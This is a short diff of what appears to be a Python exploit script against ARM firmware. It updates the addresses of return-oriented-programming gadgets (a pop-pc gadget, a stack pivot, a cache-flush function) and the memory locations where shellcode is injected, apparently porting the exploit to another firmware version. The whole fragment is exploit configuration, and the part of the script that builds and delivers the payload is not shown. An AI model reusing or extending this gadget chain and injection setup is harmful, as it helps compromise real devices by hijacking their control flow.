@@ -7,24 +7,24 @@ base = 0x81E00000
 pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xbaa4
 
 
-# 3bce0:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x3bce0
+#    3aba4:	e49df004 	pop	{pc}		; (ldr pc, [sp], #4)
+pop_pc = base + 0x3aba4
 
 #  1d98:       4798            blx     r3 ; pop     {r3, pc}
 blx_r3_pop_r3 = base + 0x1d98|1
 
-cache_func = base + 0x3BCD0
+cache_func = base + 0x3AB94
 
 test = base + 0x08B0|1 # prints "Error, the pointer of pidme_data is NULL."
 
-inject_addr = base + 0x6C000
+inject_addr = base + 0x68000
 inject_sz = 0x1000
 
 shellcode_addr = inject_addr + 0x100
 shellcode_sz = 0x200 # TODO: check size
 
-# 40f18:       4913e79d        ldmdbmi r3, {r0, r2, r3, r4, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x40f18;
+# 3fbd4:	4913e79d 	ldmdbmi	r3, {r0, r2, r3, r4, r7, r8, r9, sl, sp, lr, pc}
+pivot = base + 0x3fbd4;
 
 def main():
     with open(sys.argv[1], "rb") as fin:
